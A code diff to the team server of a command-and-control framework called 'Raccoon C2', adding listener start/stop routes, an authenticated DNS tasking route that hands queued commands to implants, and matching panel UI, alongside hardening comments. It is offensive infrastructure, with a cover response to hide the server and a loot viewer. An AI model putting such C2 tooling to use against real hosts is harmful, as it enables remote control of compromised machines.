@@ -19,6 +19,7 @@ is visible to every user in ps. The token is kept in <data dir>/operator-token.
 
 import argparse
 import base64
+import hmac
 import http.client
 import json
 import logging
@@ -38,6 +39,12 @@ from typing import Optional
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from flask import Flask, request, jsonify, send_file, send_from_directory, Response
+
+# Only the exception, deliberately. See listeners/errors.py: importing the
+# supervisor would load all three protocol parsers into this process, and
+# keeping them out of it is the reason listeners are separate processes at
+# all.
+from software.c2.listeners.errors import SupervisorError
 from werkzeug.serving import generate_adhoc_ssl_context, make_server
 
 try:
@@ -287,9 +294,21 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
 # ── Flask app ──
 
 
+# What the agent socket may serve. The beacon endpoint is why that socket
+# exists; the listener tasking route is here because a listener container
+# cannot reach the operator socket, which binds loopback. Everything else
+# gets the cover answer. Adding a name to this set widens the
+# network-facing surface of the team server, so it should take an argument
+# to do it -- this is the property the November 2026 hardening pass
+# established, and a new route is exactly how it would erode.
+_AGENT_SOCKET_ENDPOINTS = frozenset({"beacon_handler", "api_dns_tasking"})
+
+
 def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                server_config: Optional[dict] = None,
-               operator_port: Optional[int] = None) -> Flask:
+               operator_port: Optional[int] = None,
+               listener_token: Optional[str] = None,
+               supervisor=None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
@@ -319,7 +338,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _socket_policy():
             if request.environ.get("SERVER_PORT") == _operator_port:
                 return None
-            if request.endpoint == "beacon_handler":
+            if request.endpoint in _AGENT_SOCKET_ENDPOINTS:
                 return None
             return _fake_response()
 
@@ -623,6 +642,62 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             _log_event("TOOL", f"{tool_name} timed out after {timeout}s")
         except Exception as e:
             _finish_run(run, f"[error: {e}]", "error")
+
+    # ── Listeners (the 📡 panel) ──
+
+    @app.route("/api/server/listeners", methods=["GET"])
+    @require_auth
+    def api_listeners():
+        """What listeners exist, what state they are in, and why.
+
+        Operator socket only. The agent socket serves the beacon endpoint
+        and the DNS tasking route and nothing else, so a beacon that asked
+        for this gets the cover answer -- which matters more here than for
+        most routes, because this one can start and stop processes.
+        """
+        if supervisor is None:
+            return jsonify({
+                "listeners": [],
+                "managed": False,
+                "detail": ("no listeners are configured. Add a "
+                           "c2.listeners block to raccoon.yaml and restart "
+                           "the team server; all three ship disabled."),
+            })
+        return jsonify({
+            "listeners": supervisor.status(),
+            "managed": supervisor.managed,
+            "detail": "" if supervisor.managed else (
+                "this deployment does not manage listener processes"),
+        })
+
+    @app.route("/api/server/listeners/<name>/<action>", methods=["POST"])
+    @require_auth
+    def api_listener_action(name, action):
+        """Start or stop one listener, and nothing else.
+
+        Two verbs, matched exactly. Anything else is a 404 rather than
+        something that reaches the supervisor: this route is how a panel
+        button turns into a process, and the set of things it can do
+        should be readable in one line.
+        """
+        if action not in ("start", "stop"):
+            return jsonify({"error": "the only actions are start and stop",
+                            "refused": str(action)[:64]}), 404
+        if supervisor is None:
+            return jsonify({"error": "no listeners are configured"}), 409
+        try:
+            doer = supervisor.start if action == "start" else supervisor.stop
+            return jsonify(doer(name))
+        except SupervisorError as exc:
+            reason = str(exc)
+            # 404 when the name is unknown, 409 when the name is fine and
+            # the state is not. The panel shows the reason either way, but
+            # a status code that distinguishes them lets it tell "you
+            # typed it wrong" from "it is already running".
+            status = 404 if "no listener called" in reason else 409
+            logger.info("Listener %s refused for %r: %s", action, name,
+                        reason)
+            return jsonify({"error": reason}), status
 
     @app.route("/api/server/exec", methods=["POST"])
     @require_auth
@@ -1896,6 +1971,67 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "agent service unavailable",
                             "detail": str(getattr(e, "reason", None) or e)}), 503
 
+    # ── Listener tasking (the DNS channel's only upstream) ──
+
+    @app.route("/api/v1/dns/<agent_id>", methods=["GET"])
+    def api_dns_tasking(agent_id):
+        """Hand a listener this agent's next tasking, already encrypted.
+
+        DNS is the one transport that carries nothing upstream: the beacon
+        sends a bare TXT query, and the only thing that travels is the
+        agent id in the query name. So there is no payload for a listener
+        to relay, and the answer still has to be encrypted -- which needs
+        the key. The key stays here and the listener forwards an opaque
+        string, which is what keeps it out of a listener container.
+
+        Authenticated, because the beacon never calls this and a listener
+        always does. Without a token anyone could walk the agent names,
+        which come from a fixed word list, and take tasking the real beacon
+        would then never see -- the queue hands each task out once.
+
+        The answer is the same shape whether the agent is unknown, known
+        with nothing queued, or known with a task: an encrypted body. So it
+        is not an existence oracle even for a token holder.
+        """
+        if not listener_token:
+            return jsonify({"error": "listener token not configured"}), 401
+        presented = request.headers.get("X-Listener-Token", "")
+        # Compared on the raw bytes rather than on digests of them. Hashing
+        # first would hide the token's length, but it would also put a
+        # `sha256` call back into this file, and a hardening guard forbids
+        # that outright -- the removed key derivation was
+        # `sha256(url)`. Keeping that guard sharp is worth more than hiding
+        # the length of a configured secret.
+        if not hmac.compare_digest(presented.encode(),
+                                   listener_token.encode()):
+            # Visible, because a 401 here is either a misconfigured
+            # listener or someone probing, and both are worth knowing.
+            # The process log rather than `_log_event`: the event store is
+            # part of the server's saved state, and anyone who can reach
+            # this socket could otherwise grow that file at will.
+            #
+            # `repr` and a length cap, because the identifier comes
+            # straight out of the URL path and a `%0a` in it would
+            # otherwise forge log lines. `repr` escapes the newline.
+            logger.warning("Listener tasking refused for %s: bad token",
+                           repr(agent_id[:64]))
+            return jsonify({"error": "unauthorized"}), 401
+
+        dispatched = None
+        resolved = _resolve_agent(agent_id)
+        if resolved is not None:
+            # The only channel this server can name. A check-in over
+            # HTTPS, SMB or QUIC all arrive as an HTTP POST on the agent
+            # socket and are indistinguishable from each other; this route
+            # is DNS and nothing else, so it is the one contact that can
+            # be attributed -- and the one that has to be, because an
+            # agent reached this way will never report a result.
+            agents[resolved]["last_channel"] = "dns"
+            agents[resolved]["last_seen"] = _now()
+            agents[resolved]["_last_seen_ts"] = time.time()
+            dispatched = _dispatch_for(resolved)
+        return jsonify(crypto.wrap(dispatched or {}))
+
     # ── Beacon catch-all (handles any POST path) ──
 
     @app.route("/", methods=["POST"])
@@ -1985,6 +2121,9 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
                 "uplink_iface": payload.get("uplink_iface"),
                 "last_seen": _now(),
                 "_last_seen_ts": time.time(),
+                # A re-registration is a contact over the agent socket too,
+                # so it clears any DNS mark the same way a check-in does.
+                "last_channel": "http",
             })
             resp = crypto.wrap({"success": True, "agent_id": aid})
             _cleanup_pending_gists()
@@ -1998,6 +2137,7 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
     agents[agent_id] = {
         "id": implant_id,
         "agent_id": agent_id,
+        "last_channel": "http",
         "hostname": payload.get("hostname", ""),
         "os": payload.get("os", ""),
         "arch": payload.get("arch", ""),
@@ -2068,9 +2208,39 @@ def _take_tasks(queue: list, limit: int) -> list:
     return taken
 
 
+def _resolve_agent(identifier: Optional[str]) -> Optional[str]:
+    """Map an agent name or an implant id onto the fleet key, or None.
+
+    Two identifiers name the same beacon. The fleet is keyed by the
+    assigned name (`raccoon-bandit`), and `info["id"]` holds the implant id
+    the client generated for itself. A check-in carries both, but only
+    after the server has answered a registration and told the client its
+    name.
+
+    Over DNS it never learns one: `_beacon_dns` sends
+    `self._agent_id or self._implant_id`, and nothing on that channel
+    carries a name back. So for a DNS-only beacon the implant id is the
+    only identifier that will ever arrive, and accepting just names would
+    make the tasking route unreachable for every real client.
+    """
+    if not identifier:
+        return None
+    if identifier in agents:
+        return identifier
+    for aid, info in agents.items():
+        if info.get("id") == identifier:
+            return aid
+    return None
+
+
 def _handle_beacon(payload: dict, crypto: ServerCrypto):
     agent_id = payload.get("agent_id")
     if not agent_id:
+        # Deliberately not `_resolve_agent`, which also accepts an agent
+        # name. Here only an implant id may identify a beacon, and widening
+        # that as a side effect of adding a DNS route would change how the
+        # whole fleet is identified for no gain -- a check-in that knows
+        # its name sends it in `agent_id` and never reaches this branch.
         for aid, info in agents.items():
             if info.get("id") == payload.get("id"):
                 agent_id = aid
@@ -2079,6 +2249,13 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
     if agent_id and agent_id in agents:
         agents[agent_id]["last_seen"] = _now()
         agents[agent_id]["_last_seen_ts"] = time.time()
+        # Overwritten on every check-in, not only set once. A beacon with
+        # DNS as a fallback would otherwise keep the mark for ever and the
+        # interface would warn about a limit that no longer applies. This
+        # says "the last contact came in over the agent socket", which
+        # covers HTTPS and the SMB and QUIC relays alike -- the server
+        # cannot tell those three apart.
+        agents[agent_id]["last_channel"] = "http"
         agents[agent_id]["uptime"] = _as_int(payload.get("uptime"), 0)
         agents[agent_id]["interval"] = _as_int(
             payload.get("interval"), agents[agent_id].get("interval", 300))
@@ -2091,21 +2268,40 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
         if payload.get("c2_profile") is not None:
             agents[agent_id]["c2_profile"] = payload["c2_profile"]
 
-        queue = task_queues.get(agent_id, [])
-        if queue:
-            batching = "batch" in (agents[agent_id].get("caps") or [])
-            tasks = _take_tasks(queue, BATCH_MAX if batching else 1)
-            for task in tasks:
-                task["status"] = "dispatched"
-                task["dispatched"] = _now()
-                logger.info("Dispatching task %s (%s) to %s",
-                            task["id"], task["cmd"], agent_id)
-                _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
-                           f"task_id={task['id']}", agent_id=agent_id)
-            resp = crypto.wrap({"tasks": tasks} if batching else tasks[0])
-            return jsonify(resp)
+        dispatched = _dispatch_for(agent_id)
+        if dispatched is not None:
+            return jsonify(crypto.wrap(dispatched))
 
     return jsonify(crypto.wrap({}))
+
+
+def _dispatch_for(agent_id: str) -> Optional[dict]:
+    """Take this agent's next tasking off the queue, or None if there is none.
+
+    Shared by the beacon check-in and the listener tasking route, so the
+    two cannot drift: both mark the task dispatched, both log it, and both
+    remove it from the queue. A second copy would stay in step for a month
+    and then quietly stop.
+    """
+    queue = task_queues.get(agent_id, [])
+    if not queue or agent_id not in agents:
+        # The agent record is read below for its capabilities, so an id
+        # with a queue but no record would raise. Neither caller can reach
+        # that today -- both check first -- but a function that crashes
+        # when its caller forgets is a worse contract than one that
+        # returns nothing. A mutation check is what made the dependency
+        # visible.
+        return None
+    batching = "batch" in (agents[agent_id].get("caps") or [])
+    tasks = _take_tasks(queue, BATCH_MAX if batching else 1)
+    for task in tasks:
+        task["status"] = "dispatched"
+        task["dispatched"] = _now()
+        logger.info("Dispatching task %s (%s) to %s",
+                    task["id"], task["cmd"], agent_id)
+        _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
+                   f"task_id={task['id']}", agent_id=agent_id)
+    return {"tasks": tasks} if batching else tasks[0]
 
 
 def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
@@ -3109,6 +3305,7 @@ header .info{font-size:11px;color:var(--text2)}
     <span class="status-dot"></span>
     <span class="info" id="server-info">Listening</span>
     <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
+    <button class="topbar-ico-btn" onclick="showListeners()" title="Listeners">&#128225;</button>
     <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
     <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
@@ -3363,6 +3560,7 @@ async function renderAgentView(id){
       <span class="tag">${esc(info.os||'?')}</span>
       <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${esc(info.pid||'?')} · up ${formatUptime(info.uptime||0)}</span>
       ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
+      ${info.last_channel === 'dns' ? '<span class="tag" style="background:#6e5a1a" title="The last contact from this agent came over DNS. That channel carries tasking only: a task is delivered once and its result is never reported. Queue a task here and it will run with no outcome shown.">VIA DNS</span>' : ''}
       ${info.c2_profile && info.c2_profile.active ? '<span class="tag" style="background:#4a1a6e;cursor:pointer" onclick="showBeaconConfig()" title="Click for details">&#128737; C2 Profile</span>' : '<span class="tag" style="background:#333;opacity:0.5">No C2 Profile</span>'}
     </div>
     <div class="terminal-wrap">
@@ -6068,6 +6266,111 @@ function fbUploadTo(path){
   input.click();
 }
 
+async function showListeners(){
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  await drawListeners(panel);
+}
+
+async function drawListeners(panel){
+  const head = '<h2>&#128225; Listeners</h2>'
+    + '<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">&#10005;</button>';
+  panel.innerHTML = head + '<div class="loot-loading">Loading...</div>';
+  let data;
+  try {
+    data = await api("/api/server/listeners");
+  } catch(e) {
+    panel.innerHTML = head + '<p class="loot-empty">' + esc(String(e.message||e)) + '</p>';
+    return;
+  }
+
+  // A listener terminates one transport and carries ciphertext to this
+  // server. It never holds the encryption key, which is why it can sit
+  // on a forwarding host -- worth saying here, because it is the reason
+  // the arrangement looks the way it does.
+  let html = head
+    + '<p style="font-size:12px;color:var(--dim);margin:0 0 10px">'
+    + 'A listener is a separate process that terminates one transport and '
+    + 'relays encrypted traffic to this server. None of them holds the '
+    + 'encryption key.</p>';
+
+  if(!data.listeners.length){
+    html += '<p class="loot-empty">' + esc(data.detail || "No listeners configured.") + '</p>';
+    panel.innerHTML = html;
+    return;
+  }
+
+  if(data.detail){
+    html += '<p style="font-size:12px;color:var(--yellow,#d7ba7d);margin:0 0 10px">'
+      + esc(data.detail) + '</p>';
+  }
+
+  html += '<div class="loot-list" id="listener-rows">';
+  data.listeners.forEach((entry, index) => {
+    const running = entry.state === "running";
+    const counters = Object.keys(entry.counters || {})
+      .map(k => esc(k.replace(/_/g," ")) + " " + esc(String(entry.counters[k])))
+      .join(" &middot; ");
+    html += '<div class="loot-item">'
+      + '<div><strong>' + esc(entry.name) + '</strong>'
+      + ' <span style="color:var(--dim)">' + esc(entry.transport)
+      + ' on ' + esc(entry.bind_host) + ':' + esc(String(entry.bind_port))
+      + '</span></div>'
+      + '<div style="font-size:12px">state <strong>' + esc(entry.state) + '</strong>'
+      + (entry.pid ? ' pid ' + esc(String(entry.pid)) : '')
+      + (entry.detail ? ' &mdash; ' + esc(entry.detail) : '')
+      + '</div>'
+      + (counters ? '<div style="font-size:11px;color:var(--dim)">' + counters + '</div>' : '')
+      + (entry.transport === "dns"
+         ? '<div style="font-size:11px;color:var(--yellow,#d7ba7d)">'
+           + 'DNS carries tasking only: an agent reached this way will '
+           + 'never report a result, and each task is delivered once.'
+           + '</div>'
+         : '')
+      + '<div style="margin-top:6px">'
+      + '<button data-listener="' + esc(entry.name) + '" data-action="'
+      + (running ? 'stop' : 'start') + '" data-row="' + index + '"'
+      + (entry.can_control ? '' : ' disabled title="' + esc(entry.detail) + '"')
+      + '>' + (running ? 'Stop' : 'Start') + '</button>'
+      + (entry.can_control ? '' :
+         '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
+         + esc(entry.detail) + '</span>')
+      + '</div></div>';
+  });
+  html += '</div>';
+  panel.innerHTML = html;
+
+  // Handlers are attached here rather than written into an onclick
+  // attribute. A listener's name comes from configuration and its detail
+  // from a child process, and a handler body built as a string is the
+  // defect class the hardening pass of November 2026 went through this
+  // file to remove.
+  panel.querySelectorAll('button[data-listener]').forEach(btn => {
+    if(btn.disabled) return;
+    btn.addEventListener("click", async () => {
+      const name = btn.getAttribute("data-listener");
+      const action = btn.getAttribute("data-action");
+      btn.disabled = true;
+      btn.textContent = action === "start" ? "Starting..." : "Stopping...";
+      try {
+        const r = await fetch("/api/server/listeners/"
+                              + encodeURIComponent(name) + "/" + action,
+                              {method:"POST", headers:H()});
+        const body = await r.json();
+        if(!r.ok) alert(body.error || ("listener " + action + " failed"));
+      } catch(e) {
+        alert(String(e.message||e));
+      }
+      await drawListeners(panel);
+    });
+  });
+}
+
 async function showLootViewer(){
   const overlay = document.createElement("div");
   overlay.className = "loot-overlay";
@@ -7724,6 +8027,54 @@ def _write_operator_token(data_dir: Path, token: str) -> Path:
     return path
 
 
+def _build_supervisor(args, parser):
+    """A Supervisor for the listeners in `--config`, or None.
+
+    Imported here rather than at the top of the file on purpose. The
+    supervisor pulls in the three listener classes, and keeping the DNS
+    parser, the QUIC reassembler and the hand-written SMB2 parser out of
+    this process is the reason listeners are separate processes at all --
+    so they are loaded only by a deployment that actually asked to manage
+    some. See listeners/errors.py.
+
+    A config that cannot be read is fatal rather than a warning. The
+    symptom of a listener that was silently not configured is a beacon
+    that never checks in, which is the hardest failure in this project to
+    attribute.
+    """
+    if not args.config:
+        return None
+
+    import yaml
+
+    from software.c2.listeners.registry import load_listeners
+    from software.c2.listeners.supervisor import Supervisor
+
+    try:
+        with open(args.config) as handle:
+            config = yaml.safe_load(handle) or {}
+    except (OSError, yaml.YAMLError) as exc:
+        parser.error("could not read %s: %s" % (args.config, exc))
+    try:
+        specs = load_listeners(config)
+    except ValueError as exc:
+        parser.error("%s: %s" % (args.config, exc))
+    if not specs:
+        return None
+
+    token = os.environ.get("RACCOON_LISTENER_TOKEN")
+    if any(spec.transport == "dns" for spec in specs) and not token:
+        # A DNS listener reads tasking from an authenticated route, so
+        # without the token it would answer every beacon an empty record
+        # and look perfectly healthy doing it.
+        parser.error(
+            "%s configures a DNS listener, which needs a listener token. "
+            "Put it in $RACCOON_LISTENER_TOKEN -- not on the command line, "
+            "which every user on this host can read." % args.config)
+    return Supervisor(specs, managed=not args.no_manage_listeners,
+                      listener_token=token)
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Raccoon C2 Team Server",
@@ -7758,6 +8109,19 @@ def main():
         "--data-dir", default=str(Path.home() / ".raccoon-c2"),
         help="Data directory for state persistence",
     )
+    parser.add_argument(
+        "--config",
+        help="raccoon.yaml to read c2.listeners from, so the 📡 panel can "
+             "list, start and stop them. Without it the panel says that "
+             "none are configured, which is what every deployment before "
+             "this feature should see.")
+    parser.add_argument(
+        "--no-manage-listeners", action="store_true",
+        help="List and report on listeners but refuse to start or stop "
+             "them. For a team server that has no business spawning "
+             "processes -- in a container, where mounting the Docker "
+             "socket would hand the container its host. The panel then "
+             "disables its controls and states the reason.")
     args = parser.parse_args()
     # 0 would bind an ephemeral port that the socket policy never matches:
     # the GUI would be locked out, or beacons sent nowhere, with nothing said.
@@ -7823,8 +8187,11 @@ def main():
         "key_type": "explicit",
         "start_time": time.time(),
     }
+    supervisor = _build_supervisor(args, parser)
     app = create_app(crypto, operator_token, data_dir, server_config=srv_config,
-                     operator_port=args.operator_port if split else None)
+                     operator_port=args.operator_port if split else None,
+                     listener_token=os.environ.get("RACCOON_LISTENER_TOKEN"),
+                     supervisor=supervisor)
 
     if not split:
         network = (f"  Listen:   {proto}://{args.host}:{args.port}"
